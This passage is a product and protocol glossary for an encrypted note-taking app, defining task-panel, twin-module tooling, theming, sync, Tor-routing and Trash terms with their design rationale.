### **content-free notification body** &nbsp; 📦 *Product*

The default form of a [task reminder](#task-reminder)'s notification: it carries **no task text and no resolvable note identifier** — only that a reminder is due.

The registration lives in OS-owned plaintext storage and can surface on a locked screen, so putting the task's words in it would hand content to a shoulder-surfer for a convenience nobody asked for. Real text is a **separate, default-off opt-in** with its own disclosure sentence, shown at the moment the user decides, because turning it on changes what leaves the vault. The disclosure deliberately does **not** claim Myne controls what a lock screen previews — those settings are the platform's and the user's.

Used in: `threat-model.md` §7; `decisions.md` 2026-07-28; MYND-618

### **task panel** &nbsp; 📦 *Product*

The collective name for Myne's task-list surfaces (MYND-616): the vault-wide [task tab](#task-tab), the note-scoped right-panel tab, and — later — the query block. All three are **one component with a [scope selector](#scope-selector) parameter**; they differ in the list handed to them and in whether they show a task's source note.

A task panel is the one place a *view* may write to a note, and only one bit of it: a completion marker, through the single task-mutation writer. That exception is recorded and scoped in `decisions.md` 2026-07-28, which narrows the saved-views read-only rule rather than quietly ignoring it. Nothing else is editable from a panel — no text, no fields, no cells.

Used in: `decisions.md` 2026-07-28; MYND-616

### **task tab** &nbsp; 📦 *Product*

The vault-wide [task panel](#task-panel), opened as a first-class workspace tab — the pattern the knowledge-graph view established. A **singleton**: one per workspace, with a fixed sentinel id, so "open tasks" reveals the existing tab rather than making a second one.

Its selected filter and [scope](#scope-selector) persist **with the tab** in the workspace descriptor, not as a preference: preferences are for stated choices like theme and auto-lock, while "which filter am I looking at" is where the user is. Both are omit-when-default, so an untouched task tab serializes byte-identical to a descriptor written before the feature existed, and the descriptor is opaque to the storage codec — so none of this is a format change.

Used in: `decisions.md` 2026-07-28; MYND-616

### **task view** &nbsp; 📦 *Product*

Everything a [task panel](#task-panel) persists with its tab: the status, due, folder, note, tag and priority filters plus the within-section sort (`src/notes/taskView.ts`, `TaskView`). It persists **with the tab** in the workspace descriptor under the same omit-when-default rule the [task tab](#task-tab) established, so an untouched view serializes byte-identical to a descriptor written before the feature existed.

Used in: `src/notes/taskView.ts`; myne-md/myne#656

### **task destination** &nbsp; 📦 *Product*

The mobile placement of the vault-wide [task panel](#task-panel) (MYND-620): a top-level entry in the phone's bottom navigation bar, and a tab in the expanded-layout sidebar — the same shape the knowledge-graph view established.

**Not a second surface, and deliberately not a second name.** It is the [task tab](#task-tab)'s content in the placement each mobile layout offers; the filters, the sort, the empty states and the write path are the desktop's code, consumed rather than mirrored. What differs is layout and navigation.

Putting it in the bottom bar is an information-architecture statement — tasks sit alongside notes in Myne's mobile identity — and is **hard to reverse**: top-level navigation is something users learn, so removing a destination later is breaking in a way that removing a menu item is not. On a phone "what is due today" is asked more often than almost anything else, and two taps away would have confined the feature to the desktop in practice.

Used in: `decisions.md` 2026-07-28; MYND-620

### **task sheet** &nbsp; 📦 *Product*

The mobile placement of the **note-scoped** [task panel](#task-panel) (MYND-620): a sheet opened from the editor, listing only the open note's tasks.

It is the phone's answer to the desktop's permanently-visible side panel — there is no room beside an editor on a phone, so the same information arrives on request, through the sheet mechanism attachments, snapshots, templates, settings and the view editor already use. In the expanded layout the same list is a sidebar tab instead, because a larger screen can show tasks *beside* a note rather than instead of it.

Used in: `decisions.md` 2026-07-28; MYND-620

### **two-line task row** &nbsp; 📦 *Product*

The narrow-width form of the shared task row (MYND-620): the task's text on the first line, its [reminder instant](#reminder-instant) or due date and its source note as quiet metadata on the second — which is also where the overdue treatment sits.

***Nothing is dropped and nothing is truncated***, and that is the whole argument. The single-line alternatives each remove something load-bearing: truncating the text removes the one thing on the row that matters, and dropping the source note removes half the context in a vault-wide list, where the tasks come from different notes. One component serves every surface, so the row has to work for the harder case.

The state rules are unchanged by the layout: neutral surface, state carried by icon and coloured text, and **never a green check**.

Used in: `decisions.md` 2026-07-28; MYND-620

### **scope selector** &nbsp; 📦 *Product*

The narrowing control on a [task panel](#task-panel): **any of several folders** (multi-select, subtree-inclusive, OR'd) **AND any of several tags** (multi-select, OR'd). A note narrowed to one file only offers notes inside the selected folders, so the two axes cannot contradict each other.

***Myne-divergent* in both halves people expect to be an AND**: several selected folders are OR'd with each other, and several selected tags are OR'd with each other, rather than AND'd. AND'ing two tag selections returns empty for most real choices, since most notes carry one of a user's top-level tags rather than several, and a selector that usually yields nothing reads as broken rather than precise. The folder axis and the tag axis are then AND'd with each other.

It adds **no expressiveness to the query surface**: every scope it can express is one of the closed `FilterNode` leaves the saved-views work already froze (`inFolder` / `hasTag` / `and` / `or` / `all`), which is checkable rather than merely asserted.

Used in: `decisions.md` 2026-07-28; MYND-616

### **task marker** &nbsp; 📦 *Product*

The muted glyph shown on a [note-task](#note-task) in the sidebar row and on its tab, so the user's declaration is visible without opening the note. Rides the same trailing-marker treatment as the folder-index badge (`--fg-3`, 12px, inline after the title).

It marks the note as a task and says **nothing about completion** — deliberately not a check, and above all not a green check, which the design canon prohibits. Hideable via the `show_task_marker` preference, which is classified **Shared** rather than device-local: a marker's visibility is taste, not device capability, so it should not have to be re-chosen on every new device.

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-07-28

### **task field editor** &nbsp; 📦 *Product*

The per-field editing surface a [line-task](#line-task) opens from the `+` add-field menu (myne-md/myne#656): one control per field kind, with hand-rolled date and time pickers that render in the reader's `date_format` / `time_format` rather than the platform inputs (`decisions.md` 2026-09-13, myne-md/myne#614). The editor borrows the menu's tracked handle, so the menu stays mounted behind it and a commit can keep the menu open for a second field. A field the line cannot parse degrades field-by-field: the editor edits what it understands and preserves the rest as bytes.

Used in: `decisions.md` 2026-09-13 (myne-md/myne#614); myne-md/myne#656

### **task inline field** &nbsp; 📦 *Product*

The metadata a [line-task](#line-task) carries in its own line — when it is due, whether it repeats, when it was completed, how urgent it is, when to be reminded. Myne **reads three dialects and writes one**: it recognizes Obsidian's emoji form (`📅 2026-08-01`) and Obsidian's Dataview-style bracketed form (`[due:: 2026-08-01]`), and emits only the bracketed form with Myne's own key names.

Five fields are written — `due`, `repeat`, `done`, `priority`, [`remind`](#remind). Everything else Obsidian Tasks supports is read and **preserved but never emitted**, so round-tripping through Myne cannot destroy data Myne did not understand. Obsidian's `onCompletion` is preserved as bytes and given no meaning at all: it is a miniature action language, and interpreting it would cross the no-code-eval line the dialect defends elsewhere.

Reading three dialects is what makes the Obsidian importer honest — without it, an import "succeeds" and the user's tasks are silently invisible. Writing one is the accepted asymmetry: a task Myne edits drops out of that user's Obsidian Tasks view, because editing any field converts the whole line.

Used in: `spec/markdown-dialect.md` §3.8; `decisions.md` 2026-07-28

### **twin module** &nbsp; 🛠️ *Tooling*

A module that exists on both the desktop and the mobile side and answers the same question on each. Found by same relative path across `(src, mobile/src)` and `(src-tauri/src, mobile/src-tauri/src)`, plus a curated list for pairs whose two sides sit at different paths (a path sweep cannot see `src/notes/sidebarState.tsx` against `mobile/src/app/flows/EditorFlow.tsx`). The unit is the PAIR rather than the desktop path, because one desktop file may have two real mobile counterparts. Distinct from a mere same-named file: a twin is a claim that both sides answer one question, which is why every one carries a verdict and a reason.

Used in: `scripts/check-twin-inventory.mjs`, `scripts/check-twin-drift.mjs`, `docs/dev/twin-inventory.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **twin inventory** &nbsp; 🛠️ *Tooling*

The recorded classification of every twin module: both paths, a mechanical byte-difference flag, a semantic one, a verdict, a reason and a destination. It deliberately records no line count, because a live one would fail the projection check on any edit to any of the files it covers. It lives inside `scripts/check-twin-inventory.mjs` and IS the gate, so the record and the check cannot disagree; `docs/dev/twin-inventory.md` is a generated projection of it and never a second source. A twin with no verdict fails, and a verdict whose files are gone fails, because a roster that can outlive its tree describes nothing.

Used in: `scripts/check-twin-inventory.mjs`, `docs/dev/twin-inventory.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **twin-drift ratchet** &nbsp; 🛠️ *Tooling*

The recorded SET of twin pairs that currently differ semantically. It may shrink, never grow: a pair appearing in it that was not there before fails the build, and `--record` REFUSES to write a grown set, so the command the failure message suggests cannot be used to make the failure go away. A set rather than a count, because the case that actually happens is one pair converging while another diverges, which leaves a count unmoved. Only the SEMANTIC field gates: 15 of the tree's byte-different pairs differ only in a comment or the platform-seam import, and gating the byte flag would redden `pre-commit` for adding a comment to either side of a byte-identical pair. Its denominator has a separate floor, `EXAMINED_FLOOR`, kept in the guard rather than in the record, because shrinking the twin roster would shrink the set for free and read as progress.

Used in: `scripts/check-twin-drift-ratchet.mjs`, `scripts/twin-drift-ratchet.json`, `decisions.md` 2026-09-02 (twin-drift ratchet, myne-md/myne#473)

### **`@myne/client-core`** &nbsp; 🛠️ *Tooling*

The cross-client DECISION layer: a source package holding what desktop, web and mobile all answer identically, consumed the way `@myne/copy` and `@myne/dialect` are. Its entry criterion is narrow and mechanically enforced: a module belongs there only if both clients answer the same question AND it reaches no host, which is `scripts/check-platform-seam.mjs`'s `seam: null`. That is what keeps the `src/lib/vault-*.ts` family OUT, seven of those nine call `invoke` at module scope, and their shared answer lives in `myne-core` behind an IPC command instead. Holds the Rust-error mirrors, the design-token sheet, the auto-lock envelope and the [boot decision](#boot-decision); both clients keep one-line re-export shims at the old paths, so importers are unchanged and the twin pairs collapse to byte-identical, EXCEPT where the shared thing is a decision rather than a value: the two stage machines still differ, on purpose, because what they share is the answer and not the screen.

Used in: `client-core/`, `scripts/lib/shared-roots.mjs`, `scripts/check-platform-seam.mjs`, `decisions.md` 2026-09-02 (myne-md/myne#242)

### **boot decision** &nbsp; 🛠️ *Tooling*

What the boot probe FOUND, as a six-variant union with no screen in it: a resumable recovery, a live session, a failed vault-list read, no vaults, exactly one vault (carrying its id and status), or two or more. Shared by every client in `@myne/client-core/stage-decision`; each client maps it to its own `Stage`, which is where the capability gates live because a `has()` query is a fact about the host and that package reaches none.

The split is at the decision rather than at the screen deliberately. A shared `Stage` union would be the obvious answer and the wrong one: mobile has no `account-entry` and no `pending-approval`, so widening its union would put a dead arm in every exhaustive switch for two states it cannot reach, against `decisions.md` 0488's line that the screens SHOULD differ. Measured before it moved: the two implementations were byte-identical except for the two capability ternaries, and of the twenty legal transitions the two tables shared, not one routed differently.

Used in: `client-core/src/stage-decision.ts`, `src/lib/stage.ts`, `mobile/src/lib/stage.ts`, `tests/lib/stageDecision.test.ts`, `decisions.md` 2026-09-03 (myne-md/myne#477)

### **token parity** &nbsp; 🛠️ *Tooling*

Two rules over the design-token layer. One token name may have one declaration, so a name declared by both the shared sheet and a client sheet, or by two client sheets, is either a recorded override with a stated reason or a failure. And a `var(--x)` with NO fallback must name a token something declares, because an undeclared one resolves to nothing and the property is simply not applied, which reads as a deliberate flat surface rather than a bug. Scoped to fallback-less references on purpose: `var(--x, #fff)` degrades to a stated value and is a choice. Its first run found eight `var(--paper-1)` call sites, one of them in the shared `@myne/editor` package, against a token `src/AGENTS.md` warns by name does not exist.

Used in: `scripts/check-token-parity.mjs`, `client-core/src/tokens.css`, `decisions.md` 2026-09-02 (myne-md/myne#478)

### **decision (twin verdict)** &nbsp; 🛠️ *Tooling*

The verdict for a twin where both clients answer the same question, so a divergence is a bug by definition. It belongs in a shared package and its entry carries a destination, which may be `undecided` where the destination turns on a question another sub-feature settles. The majority verdict by a wide margin; `docs/dev/twin-inventory.md` carries the current count, which is generated rather than hand-copied.

Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **screen (twin verdict)** &nbsp; 🛠️ *Tooling*

The verdict for a twin that exists TO BE per-client, so its divergence is the feature rather than the bug. Two clauses: the surface a client renders (layout, navigation shape), or the host it renders into (entry points, build-time ambient globals). The second clause was added under review, when three of the entries carrying the verdict turned out to be host composition that the presentation-only wording described not at all. **Deliberately narrow** even so: what it excludes is a file that merely happens to differ per client, which is every [decision (twin verdict)](#decision-twin-verdict) in the record. Two guard tests hold it, one capping how many entries may carry it and one asserting which, because a count cannot notice a miscategorised entry.

Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **absent (twin verdict)** &nbsp; 🛠️ *Tooling*

The verdict for a twin where one client does not ship the surface at all. Its entry names the decision or issue that made it so, because a gap and a decision are indistinguishable in a diff stat and the difference is the whole point. Read the reason before treating a large line-count gap as neglect: `local_inference` reads as an absence and is a narrowed transcription-only port, since mobile runs Whisper on device while `infer` and `embed` return `NotReady`.

Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **delegated (twin verdict)** &nbsp; 🛠️ *Tooling*

The verdict for a twin whose shared answer already lives in `myne-core` or a `@myne/*` package, leaving each side as per-client wiring over it. Its divergence is correct and permanent, so it is neither a bug nor a screen. The canonical shape is a Tauri plugin shim where both sides carry `pub use myne_core::plugins::<flow>` and keep only the plugin builder and its capability grant; `src-tauri/src/plugins/vault_delete/mod.rs` at 52 lines against mobile's 53 is the worked example. The verdict says nothing about whether the two capability grants MATCH; that comparison has not been run.

Used in: `scripts/check-twin-inventory.mjs`, `core/AGENTS.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)

### **Target vault** &nbsp; 📦 *Product*

*(Aliases: none. Myne-divergent: yes — see source vault.)*

In a **vault import**, the vault notes are written INTO: the one that is unlocked, the one whose keys seal every arriving note and re-sealed attachment, and the only one the import changes. Contrast **source vault**.

Used in: `threat-model.md` A6, `spec/markdown-dialect.md` §6

### **Tauri** &nbsp; 🛠️ *Tooling*

A Rust-based framework for building cross-platform desktop applications with web-technology UIs. Myne's Phase 1 desktop-client framework (`decisions.md` Deferred #5 resolution). Supersedes the prior Electron baseline. Advantages: small TCB, ~10 MB binary vs ~150 MB Electron, ~40 MB idle RAM vs ~250 MB, achievable reproducible builds, structural memory hygiene via Rust's `zeroize`/`secrecy`/`subtle` crates, smaller updater attack surface.

Used in: `decisions.md`, `vision.md`, `threat-model.md` §3 TB7

### **syntax highlighting** &nbsp; 📦 *Product*
Language-aware token coloring of a fenced code block's contents inside the editor, applied as a presentation overlay over the live markdown source (never mutating it — notes stay plain markdown after decryption). Implemented via a nested Lezer parser + a code-only `HighlightStyle`; distinct from the cursor-aware *reveal* used for other markdown chrome (code is always colored, not hidden/revealed). Introduced MYND-154.
Used in: `src/editor/code-highlight.ts`, `design-notes.md` (2026-05-29).

### **diagram surface (`--diagram-*` tokens)** &nbsp; 📦 *Product*

The three CSS design tokens that keep a rendered [mermaid diagram](#mermaid-diagram) legible on every theme: `--diagram-surface` (the card behind it), `--diagram-ink` (the text on that card) and `--diagram-danger` (the render-failure line on the same card). They are **not** aliases of `--paper` and `--ink-1`, and the distinction is the whole point: mermaid's node palette is baked light in `themeVariables`, so the card has to stay light whatever the editor theme does, and a surface that follows the theme while the ink does not is the drift that produced dark text on a dark card. Surface and ink are a PAIR rather than two independent values, which is why naming only one of them was the bug. Every built-in theme block leaves all three alone; a custom theme can set them, because `theme-validator` accepts any name that is not `--_`-prefixed, so the invariant is a convention rather than a construction. Defined in the runtime `client-core/src/tokens.css`, which every client imports (myne-md/myne#478; it was two per-client sheets until then), mirrored in the canonical `docs/design/colors_and_type.css`, and consumed by the editor card and the HTML/PDF export stylesheet. Introduced myne-md/myne#629.

Used in: `src/styles/tokens.css`, `mobile/src/styles/tokens.css`, `docs/design/colors_and_type.css`, `editor/src/theme.ts`, `src/dialect/html/print-stylesheet.ts`.

### **syntax palette (`--syntax-*` tokens)** &nbsp; 📦 *Product*
The family of CSS design tokens (`--syntax-keyword`, `--syntax-string`, `--syntax-comment`, …) defining the syntax-highlighting colors, with a light and a dark value each. Every hue clears WCAG AA (≥4.5:1) contrast against the `--paper-2` code-card fill in both themes. The editor's code `HighlightStyle` maps Lezer code tags onto these tokens; no ad-hoc hex. Defined in the runtime `client-core/src/tokens.css` (what every client loads) and mirrored in the canonical `docs/design/colors_and_type.css`. Introduced MYND-154.
Used in: `src/styles/tokens.css`, `docs/design/colors_and_type.css`, `src/editor/code-highlight.ts`.

### **template variable** &nbsp; 📦 *Product*

A `{{token}}` placeholder in a [note template](#note-template) body that the variable engine substitutes against a fixed built-in registry at note-creation time. The registry is `{{date}}`, `{{time}}`, `{{title}}`, `{{datetime}}`, `{{weekday}}`, `{{period_start}}` and `{{period_end}}` (lowercase-only; unknown tokens are left literal, which doubles as the escape mechanism). The last two are the bounds of the [periodic note](#periodic-note) being instantiated (myne-md/myne#177); they are defined for every period and for a note made by hand, where both equal the current day, so a token is never rendered empty. Substitution is **deterministic, one-shot, eager** — parse → registry lookup → substitute, never an expression, formula, callback, or format-argument mini-language (the anti-plugin / no-scripting commitment, `vision.md`). The engine is inferred-not-declared: it scans the template body for tokens at fill time rather than reading a declared-variables field, and reads no clock or locale itself (the host injects the time-derived values). Output is plain markdown — a rendered token emits only literal text. See `spec/markdown-dialect.md` §3.6.1, the variable-engine module in `protocol/`, MYND-188.

Used in: `protocol/` variable engine (MYND-188, myne-md/myne#177); `spec/markdown-dialect.md` §3.6.1

### **test vector** &nbsp; 📋 *Protocol*

Cross-implementation byte-level fixture pinning an `input → expected-output` mapping for a specific Myne v0.1 protocol primitive. Lives in the `myne-test-vectors/` companion repository under `vectors/<category>/v0.1/cases.json`, validated against the canonical machine-readable contract at `schema/v0.1.json` (JSON Schema 2020-12, with `oneOf` dispatch on the top-level `schema` field to per-category sub-schemas in `schema/v0.1/<category>.json`). Each `cases[i]` entry carries a stable, immutable `vector_id` plus inputs (`input_<semantic>_<encoding>`) and expected outputs (`expected_<semantic>_<encoding>`) following a canonical naming convention; categories with multiple case shapes add a `case_kind` discriminator. v0.1 vectors live under the `v0.1/` directory dimension; future major-version vectors land alongside under the next major version's own directory dimension without ambiguity (the two versions are forward-incompatible by design). Vectors are the byte-level audit-substitute leg of `threat-model.md` §6 — alongside reproducible builds (TB8) and hash-pinned lockfiles (TB9 supply chain) — that compensates for the missing third-party cryptography audit at v0.1. A vector failure in any independent port (Phase 2 Go server, Phase 3 web / mobile clients) is a stop-the-world bug: either the port has drifted or the spec is wrong. Sometimes referred to as KAT (Known-Answer Test) vectors; the `vault.prefs`-related entries in this glossary use that older term — both name the same thing.

Used in: `myne-test-vectors/` (the companion repository carrying every landed `cases.json`), `protocol/tests/vectors.rs` (the integration test driving the live Rust impl against each landed category and asserting byte-equality), `threat-model.md` §6 (the audit-substitute discipline the vectors operationalize), `decisions.md` 2026-05-28 entry "Canonical test-vector schema + first new category (HKDF DeriveSubkey) landed (MYND-66 + MYND-67)" (the canonical schema mechanism), `prefs-blob` glossary entry (which mentions "byte-stable KAT vectors" — cross-reference for the older terminology).

### **text direction** &nbsp; 📦 *Product*

The writing direction of the UI and of note content — left-to-right (LTR) or right-to-left (RTL, for Arabic / Urdu / Persian / Hebrew). **Not a user setting**: layout direction *follows the active locale*. `RTL_LANGUAGES` + `isRtl()` in `src/i18n/config.ts` are the single source of truth (by script — `pa`/Gurmukhi is LTR and excluded), and `src/i18n/index.ts` reflects it onto `<html dir>` at boot and on every language change. Chrome mirrors via CSS **logical properties** (`margin-inline-*`, `inset-inline-*`, `text-align: start|end`) + an opt-in `data-flip` glyph mirror; user-authored strings are `<bdi>`-isolated so a mixed-script title never reorders surrounding UI. In the **editor**, direction is resolved per line from content (`dir=auto`) with neutral runs (URLs, code, account numbers) bidi-isolated — there is deliberately no per-note direction field and no on-disk/format surface. Direction is presentation-only and [device-local](#device-local-pref) (chosen pre-unlock, so it does **not** clear on lock, unlike the [theme](#theme-preference)). **Distinct from [bidirectional links](#bidirectional-links)**, which are wikilinks/backlinks (a graph concept), not text layout. Introduced by the rtl-support epic (`decisions.md` 2026-08-02).

### **Theme preference** &nbsp; 📦 *Product*

The user's Light / Dark / System choice, persisted as the `theme` field of [`vault.prefs`](#prefsview) (`spec/protocol.md` §9.5.2). An optional string — `"light"` or `"dark"` — where **absence of the key is the canonical encoding of "system"** (follow the OS `prefers-color-scheme`); there is no `"system"` value, so a vault that made no explicit choice omits the field and stays byte-identical to a pre-MYND-110 blob. Rendering is a **pure-CSS hybrid**: an explicit choice sets `<html data-theme="light|dark">` (overriding the OS); System and every pre-unlock screen carry no attribute, so a `prefers-color-scheme` `@media` block follows the OS live with no JS. The preference is **non-load-bearing** — a cosmetic UI setting (AS-low) with no protective-envelope clamp (unlike [AUTO_LOCK_CEILING](#auto_lock_ceiling)); a tampered or replayed `vault.prefs` can at worst surface the wrong color, and an unrecognized value decodes to "system" rather than failing. It lives inside the encrypted blob (not plaintext) so a disk-at-rest adversary learns nothing — the same structural-privacy reasoning that keeps [auto-lock](#auto-lock-on-idle)'s timeout encrypted. On lock the attribute is removed (the UI follows the OS), the UI-layer image of zeroize-on-lock. The theme is a [device-local pref](#device-local-pref) (`sync-protocol.md` §10.2, MYND-478): presentation is per-device taste, so it never crosses the Phase 2 prefs merge. Introduced MYND-110. See also [PrefsView](#prefsview), [syntax color tokens](#syntax-color-tokens), [custom theme](#custom-theme).

### **theme-install deep link** &nbsp; 📦 *Product*

A `myne://theme/install?v=1&name=…&author=…&src=…&payload=…` URL that hands a [custom theme](#custom-theme) from the website's Themes page to the desktop app in one click (MYND-567; website half MYND-568). The OS resolves the `myne://` scheme to the installed app — registered at bundle time on macOS / Windows / Linux — which then shows a **confirmation dialog** (name, author, source, palette preview) before anything is written; Apply routes through the ordinary `themes_import` into [`vault.themes`](#vaultthemes), Cancel writes nothing.

The palette travels **inside the URL** as base64url-encoded JSON, not as a link the app fetches: the client has no network egress path (CSP `connect-src` allowlist + no HTTP-client crate, gated by `no_egress.rs`), so a `src=` parameter is **displayed provenance only, never dereferenced**. Every field is treated as hostile input — any website can serve such a link — under explicit caps (16 KiB decoded payload, 64-char name, fatal UTF-8 decoding, control/bidi stripping on display strings), and the payload must still clear the host-side `theme_validator` value-shape allowlist before it is sealed. A link arriving while the vault is locked is held in an in-memory latch and presented after unlock, then dropped with the process if the user never unlocks. The `myne://` scheme is **shared with the mobile client**, which owns the `open` and `capture` actions (`decisions.md` 2026-07-13); each client ignores the other's actions. Introduced `decisions.md` 2026-07-25. See also [custom theme](#custom-theme), [vault.themes](#vaultthemes).

### **theme vocabulary** &nbsp; 📦 *Product*

The set of CSS-variable keys a [custom theme](#custom-theme) may meaningfully supply. Three families: the **colour** core (the twenty-one required ramp tokens plus the optional `--syntax-*` / `--label-*` / `--highlight-*` families), the **measure** tokens (spacing, radius, type scale, weight, tracking — clamped to 0.5×–2× of their built-in defaults), and the [ornament](#ornament-primitive) keys, scoped by [role](#ornament-role).

The vocabulary is **open, and growing it is not a format event**: `vault.themes` carries the same flat map (§9.21), only the required core is fixed, and an unrecognized key is written and ignored rather than rejected. That is what lets an older client render a newer theme — it applies the colours it understands and skips ornament it has never heard of — and it is why adding a family costs no migration, no magic byte and no version bump.

The vocabulary is also not the readability gate: the WCAG floors apply to the colour pairs they name (resolving a semantic alias in place of its ramp token, since the app reads the alias), refuse a gated colour they cannot resolve, and say nothing about the rest of the map.

Distinguish it from the **value-shape allowlist**, which is a security control over what a value may *look like* and is deliberately narrow (`threat-model.md` "Custom-theme CSS-value surface"). The vocabulary says which keys mean something; the allowlist says which values may exist at all. Widening the first has never required widening the second.

Used in: `decisions.md` 2026-08-06; `spec/protocol.md` §9.21

### **throughput routing preference** &nbsp; 📋 *Protocol*

The `provider.sort = throughput` field on every OpenRouter request (myne-md/myne#620), including ordinary chat as well as [agent runs](#agent-run). OpenRouter is a broker that forwards to model vendors, so "who receives this" is a set Myne can bound only at its first hop; the `provider` object is the one surface Myne has over the second hop, and this is Myne starting to use it.

**The criterion expressed is speed, and no data-handling term is expressed. That is a choice rather than an absence.** The broker's routing object does carry one, `data_collection`, which routes only to vendors that do not store or train on prompts, alongside `only` and `ignore` for explicit vendor pinning. Myne adopted the field about speed and declined that one. Whether to set `data_collection: deny` is an open product decision recorded in `decisions/ai/0555`: it narrows the recipient set on the axis this project cares about most, and it narrows it enough that a given model may have no qualifying vendor, which turns a privacy default into a feature that intermittently fails. What it buys is measured (a run served at 9 to 22 tokens per second where 150 would have been 63 seconds instead of 792); what it costs is that the set of possible recipients is now influenced by Myne rather than left to the broker's default.

Used in: `decisions/ai/0555`, `threat-model.md` TB13

### **threat model** &nbsp; ⚠️ *Threat*

The structured catalog of adversaries, assets, trust boundaries, and defensive posture that defines what Myne protects against and what it explicitly does not. The authoritative document is `threat-model.md`. Marketing copy must not exceed the guarantees there; that document is normative for what users may rely on.

Used in: `threat-model.md`

### **TOFU bootstrap** &nbsp; 📋 *Protocol*

Trust-on-first-use: how a freshly enrolled or reset device adopts its first [vault head](#vault-head). [Fork-consistency](#fork-consistency) via version-vector dominance is a **continuity** guarantee — it only protects a device that already holds a persisted last-seen baseline. A device with no baseline has nothing to compare against, so it takes the server-served head on faith after verifying its MAC (the MAC proves "a `root_key` holder authored this", **not** "this is the latest, unforked head") — the same model as Signal/Matrix key TOFU. The "first device" is not cryptographically special; "has-a-baseline-or-not" is (a reset device is also a TOFU client). The only hardening is an out-of-band [bootstrap-fingerprint](#bootstrap-fingerprint) compared at the device-approval gate. Phase 2.

Used in: `spec/sync-protocol.md` (vault head); `threat-model.md` §7

### **tombstone horizon** &nbsp; 📋 *Protocol*

The Phase 2 bound on how long a deletion [tombstone](#deleted-attachment-tombstone) is retained before garbage collection. A deletion is a `deleted`-marked new encrypted version (carried in the [vault head](#vault-head) manifest until GC, §4.2), not a bare "absent on disk → drop". A tombstone is collected once **every horizon-active device's [sync cursor](#sync-cursor) has acked past** the delete-version; a device that falls behind the horizon is [soft-retired](#soft-retire) and must [full-reconcile](#full-reconcile) on return. The horizon is **month-scale (90–180 days)**, not days — cost is asymmetric (an over-long tombstone is a tiny meta record; too short forces a full-resync). Prevents the Cassandra-zombie resurrection a bare grace-drop would allow. Phase 2.

Used in: `spec/sync-protocol.md` §11

### **Tor routing mode** &nbsp; 📦 *Product*

The desktop's opt-in Settings → Developer → Network switch ("Route sync through Tor"; device-local, **off by default**, and hidden entirely while [Developer mode](#developer-mode) is off — MYND-650) that routes Myne's entire sync egress (request/response, the SSE poke stream, and the first connection itself), and since myne-md/myne#607 the desktop AI provider transport too, through the bundled [arti sidecar](#arti-sidecar)'s loopback SOCKS5 proxy. **Fail-closed** is the defining property: while the mode is on and the proxy is not bootstrapped, sync **pauses** and no direct connection is ever attempted, so a transient Tor failure cannot silently put the user back on the clearnet. DNS resolves remotely by construction (the SOCKS5 `CONNECT` carries the domain-name address type, never a pre-resolved address), so the local resolver never learns the sync hostname. The scope of protection is deliberately narrow and must be described as such: it hides the user's **network location** — the source IP the sync server sees (AS14/A2) and the fact, visible to an ISP or local observer, that this device talks to a particular sync server — and it changes **nothing** about app-layer metadata (A13: blob size, count, sync timing, presence) or about the stable [`account_number_hash`](#account_number_hash) pseudonym the server sees on every sync. It is **not anonymity to Myne**, and no surface may call it that. Two consequences follow from endpoints being ordinary clearnet hosts (no `.onion` in v0.1): the exit node sees the destination, and the certificate check therefore runs **inside** the tunnel. **What an exit cannot do** is choose its own leaf: the first connection, like every later one, verifies the chain and the requested server name against the same bundled public CA roots ([in-transit encryption](#in-transit-encryption)), and an exit cannot produce a certificate that passes without a trusted public CA. **The user is not asked for a certificate fingerprint to enroll over Tor**, which they were until 2026-09-28: that step existed because the first handshake once accepted any certificate, which made the exit node's position one it *occupied* rather than had to reach (`decisions/sync/0620` supersedes `decisions/security/0392` on this point; the source-IP and metadata limits above are unchanged). The setting is device-local — network posture belongs to a device, not to a vault — so it is never written into the synced [`vault.prefs`](#vaultprefs) blob. Desktop only: the web client has no equivalent (a browser exposes no raw socket; the answer there is Tor Browser) and mobile is deferred to MYND-652.

Used in: `decisions.md` 2026-07-31; `threat-model.md` §7 (+ the AS14 row)

### **traffic analysis** &nbsp; ⚠️ *Threat*

Adversary class A13: a server-side or network observer correlating sync timing, blob sizes, and account activity to infer behavior even without decrypting content. Myne v0.1 is Best-effort against A13 — sync timing, blob count, and blob size are visible to anyone observing the network or the server, and connection IPs are visible transiently (not logged). Padding, cover traffic, and timing randomization are deferred beyond v0.1.

Used in: `threat-model.md` §1 (A13), §7

### **transcript** &nbsp; 📦 *Product*

The machine-produced text of an audio attachment — the output of on-device [speech-to-text](#speech-to-text-asrstt) (ASR). Unlike a lossless PDF text-layer, an ASR transcript is **lossy and model-dependent**: a different Whisper model (or a bump of the [extractor version](#extractor-version)) yields different text, so it is honestly a fallible machine guess, not a verbatim record. Cached per attachment in the [`MYE1`](#mye1) [extracted-text](#attachment-text-extraction) blob (device-local, rebuildable, never synced) for ambient search parity, and separately **insertable into a note body by an explicit user action** (SYNC-17) — that inserted copy is ordinary note text on the `MY01` `note_save` path, so it is synced, backed up, and editable (the hybrid representation, `decisions.md` 2026-07-19). (MYND-270)

### **Trash** &nbsp; 📦 *Product*

The vault-internal soft-delete state introduced in v0.2 (MYND-133): deleting a note moves it to the Trash (recoverable) instead of erasing it; a separate Trash panel lets the user restore a note or permanently delete it (single, or "empty trash"). Represented **inside the encrypted blob** as the Myne-managed `trashed:` frontmatter field (an RFC 3339 timestamp), not as a `<vault>/.trash/` directory — so a filesystem adversary (A4/A7) learns nothing new and the on-disk layout stays flat (`protocol.md` §9.1 unchanged), preserving the same AS3 posture as virtual folders (MYND-144). Trash/restore are **TS orchestrators** (`src/notes/trashNote.ts` — set/clear `trashed:` via the existing `note_update`), not new backend commands; "empty trash" hard-deletes each trashed note via the existing `note_delete` (`src/notes/emptyTrash.ts`). Trash is **manual-only** — nothing auto-expires. Because every state is either a note-content edit (`trashed:` set/clear) or the existing delete-tombstone, soft-trash adds no new Phase 2 sync wire-format state. Distinct from **hard-delete** (`note_delete`, the v0.1 permanent erase that the Trash panel's "Delete permanently" still invokes) and from OS-level "Move to Trash" (permanently rejected, `decisions.md` 2026-05-07). See 